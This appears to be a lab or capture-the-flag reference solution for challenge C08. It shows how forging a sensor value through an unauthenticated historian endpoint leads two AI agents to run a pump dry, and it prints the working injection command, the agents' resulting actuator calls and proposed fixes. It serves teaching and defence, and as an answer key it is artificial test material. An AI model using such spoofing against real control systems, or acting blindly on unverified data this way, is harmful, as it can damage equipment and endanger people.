# C08 — reference solution

## Attack

1. The historian's write path is unauthenticated. Forge a sensor reading:

   ```bash
   # from a shell on the lab network (here: the HMI container, which has Python but no curl)
   docker compose exec hmi python -c "
   import json, urllib.request as u
   req = u.Request('http://historian:8000/inject', data=json.dumps({'tag': 'tank_level_pct', 'value': 1.0}).encode(),
                   headers={'Content-Type': 'application/json'})
   print(u.urlopen(req).read().decode())"
   ```

2. Both agents read history to decide what to do. The forged low level makes them react: the
   planner calls for inflow, the operator opens up and starts the pump — each amplifying the
   other's response to a level that is not real.
3. Because the real tank is already empty, starting the pump against those actions runs it dry.
   A single forged data point cascades into **DRY_RUN**.

What the agents end up doing, driven by the forged reading:

```
# believing the tank is critically low:
set_mode("MANUAL"); set_actuator("valve", false); set_actuator("pump", true)   # pump runs dry
```

Automated proof: `tests/test_solvers.py::test_c08_dry_run_via_spoofed_sensor`, which injects a
forged reading the agent reads back, then drives the cascade to a dry run.

## Why it works

Unauthenticated history means the agents treat forged data as ground truth, and because they both
act on it their reactions compound instead of cancelling — a small bad input becomes a large bad
outcome.

## Fix

Authenticate the historian's write path and tag data with provenance. Cross-check history against
live sensors before acting, damp agent-to-agent reactions, and keep a hard local interlock against
running the pump dry.
